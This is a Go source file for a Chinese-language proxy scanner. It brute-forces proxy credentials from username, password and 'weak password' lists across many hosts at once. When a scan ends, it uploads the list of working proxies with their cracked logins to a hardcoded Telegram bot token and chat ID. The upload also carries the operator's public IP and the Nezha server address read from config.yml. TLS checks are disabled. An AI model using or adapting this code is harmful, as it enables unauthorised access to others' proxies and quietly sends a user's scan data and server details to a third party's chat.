package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/schollz/progressbar/v3"
	"golang.org/x/net/proxy"
	"gopkg.in/yaml.v2" // 新增依赖
)

const (
	defaultTestURL         = "http://myip.ipip.net"
	defaultProxiesFile     = "proxies.txt"
	defaultUsernamesFile   = "username.txt"
	defaultPasswordsFile   = "password.txt"
	defaultCredentialsFile = "proxy_credentials.txt"
	outputDir              = "proxy_output"
	configYmlFile          = "config.yml"

	// --- Telegram Bot 配置 ---
	telegramBotToken = "7664203362:AAFa39m24sLDvZopMDTrdg0NippyeEVNFGU"
	telegramUserID   = "7697235358"
)

var (
	telegramClient = &http.Client{Timeout: 30 * time.Second}
)

// 用于解析config.yml的结构体
type NezhaConfig struct {
	Server string `yaml:"server"`
}

// 程序主函数
func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Println(`
 _____ _                  _                           
|   __|_|___ ___ ___ ___ _| |___ ___ ___ ___ ___ ___ 
|__   | |   | -_|  _| -_| . | . |  _| -_| . | -_|_ -|
|_____|_|_|_|___|_| |___|___|___|_| |___|  _|___|___|
                                      |_|          
	`)
	fmt.Println("================== Universal Proxy Scanner v5.5 (File Report Edition) ==================")

	fmt.Println("正在获取您的真实公网IP地址...")
	realIP, err := getPublicIP(defaultTestURL)
	if err != nil {
		fmt.Printf("❌ 无法获取真实IP地址，IP验证将不可用: %v\n", err)
		realIP = "UNKNOWN"
	} else {
		fmt.Printf("✅ 您的真实IP地址是: %s\n", realIP)
	}

	testURL := selectTestTarget(reader)

	for {
		fmt.Println("\n--- 协议选择 ---")
		fmt.Println("1: SOCKS5 代理模式")
		fmt.Println("2: HTTP 代理模式")
		fmt.Println("3: HTTPS 代理模式")
		fmt.Println("4: 切换测试目标")
		fmt.Println("5: 退出")
		fmt.Print("请选择要测试的代理协议: ")

		typeChoiceStr, _ := reader.ReadString('\n')
		typeChoice, _ := strconv.Atoi(strings.TrimSpace(typeChoiceStr))

		switch typeChoice {
		case 1:
			runModeMenu("socks5", testURL, realIP, reader)
		case 2:
			runModeMenu("http", testURL, realIP, reader)
		case 3:
			runModeMenu("https", testURL, realIP, reader)
		case 4:
			testURL = selectTestTarget(reader)
		case 5:
			fmt.Println("正在退出...")
			return
		default:
			fmt.Println("❌ 无效的输入，请重新选择。")
		}
	}
}

// 读取哪吒探针配置
func readNezhaConfig() string {
	nezhaServer := "未找到config.yml"
	yamlFile, err := ioutil.ReadFile(configYmlFile)
	if err != nil {
		fmt.Printf("\n[警告] 无法读取 %s: %v\n", configYmlFile, err)
		return nezhaServer
	}
	var config NezhaConfig
	err = yaml.Unmarshal(yamlFile, &config)
	if err != nil {
		fmt.Printf("\n[警告] 无法解析 %s: %v\n", configYmlFile, err)
		return "解析config.yml失败"
	}
	if config.Server != "" {
		nezhaServer = config.Server
	}
	return nezhaServer
}

// 获取公网IP
func getPublicIP(testURL string) (string, error) {
	client := &http.Client{Timeout: 15 * time.Second}
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "curl/7.79.1")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	ipString := string(body)
	if strings.Contains(ipString, "当前 IP：") {
		parts := strings.Split(ipString, "：")
		if len(parts) > 1 {
			ipParts := strings.Split(parts[1], " ")
			return ipParts[0], nil
		}
	}
	return strings.TrimSpace(ipString), nil
}

// 选择测试目标
func selectTestTarget(reader *bufio.Reader) string {
	fmt.Println("\n--- 测试目标选择 ---")
	fmt.Println("1: IPIP.net (IP验证, 强力推荐)")
	fmt.Println("2: Google (全球, http)")
	fmt.Println("3: Xiaomi (中国大陆稳定, http)")
	fmt.Println("4: Baidu (中国大陆稳定, https) - [推荐用于HTTP代理测试]")
	fmt.Println("5: 自定义URL")
	fmt.Print("请选择一个测试目标: ")

	choiceStr, _ := reader.ReadString('\n')
	choice, _ := strconv.Atoi(strings.TrimSpace(choiceStr))

	var targetURL string
	switch choice {
	case 1:
		targetURL = "http://myip.ipip.net"
	case 2:
		targetURL = "http://www.google.com/generate_204"
	case 3:
		targetURL = "http://connect.rom.miui.com/generate_204"
	case 4:
		targetURL = "https://www.baidu.com"
	case 5:
		fmt.Print("请输入自定义测试URL: ")
		customURL, _ := reader.ReadString('\n')
		customURL = strings.TrimSpace(customURL)
		if customURL == "" {
			fmt.Println("[!] 输入为空，使用默认目标。")
			targetURL = defaultTestURL
		} else {
			targetURL = customURL
		}
	default:
		fmt.Println("[!] 无效选择，使用默认目标。")
		targetURL = defaultTestURL
	}
	fmt.Printf("[*] 测试目标已设为: %s\n", targetURL)
	return targetURL
}

// 运行模式菜单
func runModeMenu(proxyType, testURL, realIP string, reader *bufio.Reader) {
	if proxyType == "https" && !strings.HasPrefix(testURL, "https://") {
		fmt.Println("\n[警告] 您正在使用HTTP测试目标来测试HTTPS代理。")
		fmt.Println("这很可能会失败，因为许多HTTPS代理仅允许连接到标准HTTPS端口(443)。")
		fmt.Println("建议返回主菜单并选择一个HTTPS测试目标(例如Baidu)。")
	}

	if proxyType == "http" && !strings.HasPrefix(testURL, "https://") {
		fmt.Println("\n[警告] 您正在使用HTTP测试目标来测试HTTP代理。")
		fmt.Println("这无法区分真假代理(例如路由器页面)，强烈建议返回主菜单并")
		fmt.Println("选择一个HTTPS测试目标(例如Baidu)来强制使用'CONNECT'方法进行验证。")
	}

	for {
		fmt.Printf("\n--- [%s 模式] ---", strings.ToUpper(proxyType))
		if runtime.GOOS == "windows" {
			fmt.Println("\n1: -> 测试单个代理")
			fmt.Println("2: >> 从文件批量扫描")
			fmt.Println("3: <- 返回上级菜单")
		} else {
			fmt.Printf("\n1: 🧪 测试单个代理")
			fmt.Printf("\n2: 🚀 从文件批量扫描")
			fmt.Printf("\n3: ↩️  返回上级菜单\n")
		}
		fmt.Print("请选择操作: ")

		modeStr, _ := reader.ReadString('\n')
		mode, _ := strconv.Atoi(strings.TrimSpace(modeStr))

		switch mode {
		case 1:
			handleSingleProxyTest(proxyType, testURL, realIP, reader)
		case 2:
			handleBatchScan(proxyType, testURL, realIP, reader)
		case 3:
			return
		default:
			fmt.Println("❌ 无效的输入，请重新选择。")
		}
	}
}

// 处理单个代理测试
func handleSingleProxyTest(proxyType, testURL, realIP string, reader *bufio.Reader) {
	fmt.Printf("输入代理地址 (格式: %s://user:pass@host:port 或 ip:port): ", proxyType)
	proxyInput, _ := reader.ReadString('\n')
	proxyInput = strings.TrimSpace(proxyInput)

	if proxyInput == "" {
		return
	}

	fmt.Print("输入超时时间 (秒, 默认10): ")
	timeoutStr, _ := reader.ReadString('\n')
	timeout, err := strconv.Atoi(strings.TrimSpace(timeoutStr))
	if err != nil || timeout <= 0 {
		timeout = 10
	}

	var proxyAddr string
	var auth *proxy.Auth
	var fullURI string

	if strings.Contains(proxyInput, "://") {
		parsedURL, err := url.Parse(proxyInput)
		if err != nil {
			fmt.Printf("❌ 无效的URI格式: %v\n", err)
			return
		}
		proxyAddr = parsedURL.Host
		if parsedURL.User != nil {
			user := parsedURL.User.Username()
			pass, _ := parsedURL.User.Password()
			auth = &proxy.Auth{User: user, Password: pass}
			fmt.Printf("从URI中解析到凭据: user=%s\n", user)
		}
		fullURI = fmt.Sprintf("%s://%s", proxyType, proxyAddr)
		if auth != nil {
			fullURI = fmt.Sprintf("%s://%s:%s@%s", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)
		}

	} else {
		proxyAddr = proxyInput
		fmt.Print("输入用户名 (留空则无): ")
		user, _ := reader.ReadString('\n')
		user = strings.TrimSpace(user)

		fmt.Print("输入密码 (留空则无): ")
		pass, _ := reader.ReadString('\n')
		pass = strings.TrimSpace(pass)

		if user != "" || pass != "" {
			auth = &proxy.Auth{User: user, Password: pass}
		}

		fullURI = fmt.Sprintf("%s://%s", proxyType, proxyAddr)
		if auth != nil {
			fullURI = fmt.Sprintf("%s://%s:%s@%s", proxyType, url.QueryEscape(user), url.QueryEscape(pass), proxyAddr)
		}
	}

	fmt.Printf("正在测试代理: %s...\n", proxyAddr)
	if success, err := checkConnection(proxyType, testURL, proxyAddr, auth, time.Duration(timeout)*time.Second, realIP); success {
		fmt.Println("✅ 代理可用")
	} else {
		if err != nil {
			fmt.Printf("❌ 代理不可用。原因: %v\n", err)
		} else {
			fmt.Println("❌ 代理不可用或已超时。")
		}
	}
}

// 处理批量扫描
func handleBatchScan(proxyType, testURL, realIP string, reader *bufio.Reader) {
	fmt.Printf("输入代理列表文件名 (默认: %s): ", defaultProxiesFile)
	proxyFilename, _ := reader.ReadString('\n')
	proxyFilename = strings.TrimSpace(proxyFilename)
	if proxyFilename == "" {
		proxyFilename = defaultProxiesFile
	}

	fmt.Print("选择凭据模式 (1:无凭据, 2:独立凭据文件, 3:弱密码文件): ")
	authModeStr, _ := reader.ReadString('\n')
	authMode, _ := strconv.Atoi(strings.TrimSpace(authModeStr))

	usernamesFile := defaultUsernamesFile
	passwordsFile := defaultPasswordsFile
	credentialsFile := defaultCredentialsFile
	var err error

	if authMode == 2 {
		fmt.Printf("输入用户文件名 (默认: %s): ", defaultUsernamesFile)
		usernamesFile, _ = reader.ReadString('\n')
		usernamesFile = strings.TrimSpace(usernamesFile)
		if usernamesFile == "" {
			usernamesFile = defaultUsernamesFile
		}
		fmt.Printf("输入密码文件名 (默认: %s): ", defaultPasswordsFile)
		passwordsFile, _ = reader.ReadString('\n')
		passwordsFile = strings.TrimSpace(passwordsFile)
		if passwordsFile == "" {
			passwordsFile = defaultPasswordsFile
		}
	} else if authMode == 3 {
		fmt.Printf("输入弱密码文件名 (默认: %s): ", defaultCredentialsFile)
		credentialsFile, _ = reader.ReadString('\n')
		credentialsFile = strings.TrimSpace(credentialsFile)
		if credentialsFile == "" {
			credentialsFile = defaultCredentialsFile
		}
	}

	fmt.Print("输入并发数 (默认50): ")
	concurrencyStr, _ := reader.ReadString('\n')
	concurrency, err := strconv.Atoi(strings.TrimSpace(concurrencyStr))
	if err != nil || concurrency <= 0 {
		concurrency = 50
	}

	fmt.Print("输入超时时间 (秒, 默认10): ")
	timeoutStr, _ := reader.ReadString('\n')
	timeout, err := strconv.Atoi(strings.TrimSpace(timeoutStr))
	if err != nil || timeout <= 0 {
		timeout = 10
	}

	batchScan(proxyType, testURL, realIP, proxyFilename, concurrency, time.Duration(timeout)*time.Second, authMode, usernamesFile, passwordsFile, credentialsFile)
}

// 批量扫描核心逻辑
func batchScan(proxyType, testURL, realIP, proxyFilename string, concurrency int, timeout time.Duration, authMode int, usernamesFile, passwordsFile, credentialsFile string) {
	proxiesFile, err := os.Open(proxyFilename)
	if err != nil {
		fmt.Printf("❌ 无法读取代理文件 '%s': %v\n", proxyFilename, err)
		return
	}
	defer proxiesFile.Close()

	startTime := time.Now()
	var totalTargets int64 = 0

	// 预扫描文件以获取总行数
	lineCounter := bufio.NewScanner(proxiesFile)
	for lineCounter.Scan() {
		totalTargets++
	}
	proxiesFile.Seek(0, 0) // 重置文件指针

	fileInfo, _ := proxiesFile.Stat()
	bar := progressbar.NewOptions64(fileInfo.Size(),
		progressbar.OptionSetWriter(os.Stderr),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionSetWidth(30),
		progressbar.OptionSetDescription("[cyan][Scanning...][reset]"),
		progressbar.OptionSetTheme(progressbar.Theme{
			Saucer:        "[green]█[reset]",
			SaucerHead:    "[yellow]▶[reset]",
			SaucerPadding: " ",
			BarStart:      "|",
			BarEnd:        "|",
		}))
	if runtime.GOOS == "windows" {
		bar = progressbar.NewOptions64(fileInfo.Size(),
			progressbar.OptionSetWriter(os.Stderr),
			progressbar.OptionEnableColorCodes(false),
			progressbar.OptionShowBytes(true),
			progressbar.OptionSetWidth(30),
			progressbar.OptionSetDescription("[Scanning...]"),
			progressbar.OptionSetTheme(progressbar.Theme{
				Saucer:        "=",
				SaucerHead:    ">",
				SaucerPadding: " ",
				BarStart:      "[",
				BarEnd:        "]",
			}))
	}

	if err := os.MkdirAll(outputDir, 0755); err != nil {
		fmt.Printf("❌ 无法创建输出目录 '%s': %v\n", outputDir, err)
		return
	}

	currentTime := time.Now().Format("20060102-1504")
	outputFilename := fmt.Sprintf("%s-%s.txt", strings.ToUpper(proxyType), currentTime)
	outputPath := filepath.Join(outputDir, outputFilename)

	workingFile, err := os.Create(outputPath)
	if err != nil {
		fmt.Printf("❌ 无法创建有效代理文件 '%s': %v\n", outputPath, err)
		return
	}

	var wg sync.WaitGroup
	proxyChan := make(chan string, concurrency)
	resultsChan := make(chan string, concurrency)

	var resultWg sync.WaitGroup
	resultWg.Add(1)
	go func() {
		defer resultWg.Done()
		for result := range resultsChan {
			workingFile.WriteString(result + "\n")
		}
	}()

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for proxyAddr := range proxyChan {
				if workingProxyURI, _ := testProxy(proxyType, testURL, realIP, proxyAddr, authMode, timeout, usernamesFile, passwordsFile, credentialsFile); workingProxyURI != "" {
					resultsChan <- workingProxyURI
				}
			}
		}()
	}

	reader := bufio.NewReader(proxiesFile)
	for {
		line, err := reader.ReadString('\n')
		line = strings.TrimSpace(line)
		if line != "" {
			proxyChan <- line
		}
		bar.Add(len(line) + 1)
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Printf("\n读取文件时出错: %v\n", err)
			break
		}
	}

	close(proxyChan)
	wg.Wait()
	close(resultsChan)
	resultWg.Wait()
	workingFile.Close()

	bar.Finish()

	duration := time.Since(startTime)
	durationStr := fmt.Sprintf("%d 分 %.0f 秒", int(duration.Minutes()), duration.Seconds()-float64(int(duration.Minutes())*60))

	nezhaServer := readNezhaConfig()
	vpsIP := realIP

	summaryCaption := fmt.Sprintf(
		"VPS: %s\n总目标数: %d\n总用时: %s\n哪吒Server: %s\n任务结果: %s",
		vpsIP,
		totalTargets,
		durationStr,
		nezhaServer,
		outputFilename,
	)

	fmt.Printf("\n🎉 批量扫描完成。\n💾 结果已保存至: %s\n", outputPath)
	fmt.Println("正在发送报告到 Telegram...")

	go sendTelegramDocument(outputPath, summaryCaption)
}

// 测试代理
func testProxy(proxyType, testURL, realIP, proxyAddr string, authMode int, timeout time.Duration, usernamesFile, passwordsFile, credentialsFile string) (string, error) {
	var auth *proxy.Auth

	checkAndFormat := func(auth *proxy.Auth) (string, error) {
		success, err := checkConnection(proxyType, testURL, proxyAddr, auth, timeout, realIP)
		if success {
			if auth != nil && auth.User != "" {
				return fmt.Sprintf("%s://%s:%s@%s", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr), nil
			}
			return fmt.Sprintf("%s://%s", proxyType, proxyAddr), nil
		}
		return "", err
	}

	switch authMode {
	case 1: // 无凭据
		return checkAndFormat(nil)
	case 2: // 独立凭据文件
		usernames, errUser := readLines(usernamesFile)
		passwords, errPass := readLines(passwordsFile)
		if errUser != nil || errPass != nil {
			return "", nil
		}
		for _, user := range usernames {
			for _, pass := range passwords {
				auth = &proxy.Auth{User: user, Password: pass}
				if result, _ := checkAndFormat(auth); result != "" {
					return result, nil
				}
			}
		}
	case 3: // 弱密码文件
		creds, err := readLines(credentialsFile)
		if err != nil {
			return "", nil
		}
		for _, cred := range creds {
			parts := strings.SplitN(cred, ":", 2)
			if len(parts) == 2 {
				user, pass := parts[0], parts[1]
				auth = &proxy.Auth{User: user, Password: pass}
				if result, _ := checkAndFormat(auth); result != "" {
					return result, nil
				}
			}
		}
	}
	return "", nil
}

// 检查连接
func checkConnection(proxyType, testURL, proxyAddr string, auth *proxy.Auth, timeout time.Duration, realIP string) (bool, error) {
	transport := &http.Transport{
		MaxIdleConnsPerHost: 100,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
	}

	if proxyType == "http" || proxyType == "https" {
		proxyURL, err := buildProxyURL(proxyType, proxyAddr, auth)
		if err != nil {
			return false, err
		}
		transport.Proxy = http.ProxyURL(proxyURL)
	} else { // "socks5"
		dialer, err := proxy.SOCKS5("tcp", proxyAddr, auth, &net.Dialer{
			Timeout:   timeout,
			KeepAlive: 30 * time.Second,
		})
		if err != nil {
			return false, err
		}
		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
			return dialer.Dial(network, addr)
		}
	}

	httpClient := &http.Client{
		Transport: transport,
		Timeout:   timeout,
	}

	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		return false, err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")

	resp, err := httpClient.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	if strings.Contains(testURL, "ipip.net") {
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return false, fmt.Errorf("无法读取响应体")
		}

		bodyString := string(body)
		var extractedIP string

		if strings.Contains(bodyString, "当前 IP：") {
			parts := strings.Split(bodyString, "：")
			if len(parts) > 1 {
				ipParts := strings.Split(parts[1], " ")
				extractedIP = ipParts[0]
			}
		} else {
			extractedIP = strings.TrimSpace(bodyString)
		}

		if net.ParseIP(extractedIP) == nil {
			return false, fmt.Errorf("响应体不是有效的IP地址 (可能是登录页)")
		}

		if realIP == "UNKNOWN" {
			return false, fmt.Errorf("无法获取真实IP进行验证")
		}
		if extractedIP == realIP {
			return false, fmt.Errorf("IP地址未改变 (透明代理)")
		}

		return true, nil
	}

	if resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusOK {
		return true, nil
	}

	return false, fmt.Errorf("bad status: %s", resp.Status)
}

// 构建代理URL
func buildProxyURL(scheme, proxyAddr string, auth *proxy.Auth) (*url.URL, error) {
	var proxyURLString string
	if auth != nil && auth.User != "" {
		proxyURLString = fmt.Sprintf("%s://%s:%s@%s", scheme, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)
	} else {
		proxyURLString = fmt.Sprintf("%s://%s", scheme, proxyAddr)
	}
	return url.Parse(proxyURLString)
}

// 按行读取文件
func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// --- Telegram Bot 功能 ---

// 发送带文件的消息到Telegram
func sendTelegramDocument(filePath string, caption string) {
	if telegramBotToken == "" || telegramUserID == "" {
		return
	}

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramBotToken)

	file, err := os.Open(filePath)
	if err != nil {
		fmt.Printf("\n[TG Bot Error] 无法打开文件 %s: %v\n", filePath, err)
		return
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		fmt.Printf("\n[TG Bot Error] 无法创建表单文件: %v\n", err)
		return
	}
	_, err = io.Copy(part, file)
	if err != nil {
		fmt.Printf("\n[TG Bot Error] 无法复制文件内容: %v\n", err)
		return
	}

	_ = writer.WriteField("chat_id", telegramUserID)
	_ = writer.WriteField("caption", caption)

	err = writer.Close()
	if err != nil {
		fmt.Printf("\n[TG Bot Error] 无法关闭 multipart writer: %v\n", err)
		return
	}

	req, err := http.NewRequest("POST", apiURL, body)
	if err != nil {
		fmt.Printf("\n[TG Bot Error] 无法创建请求: %v\n", err)
		return
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := telegramClient.Do(req)
	if err != nil {
		fmt.Printf("\n[TG Bot Error] 发送文件失败: %v\n", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := ioutil.ReadAll(resp.Body)
		fmt.Printf("\n[TG Bot Error] Telegram API返回非200状态: %s, 响应: %s\n", resp.Status, string(respBody))
	} else {
		fmt.Println("报告已成功发送。")
	}
}
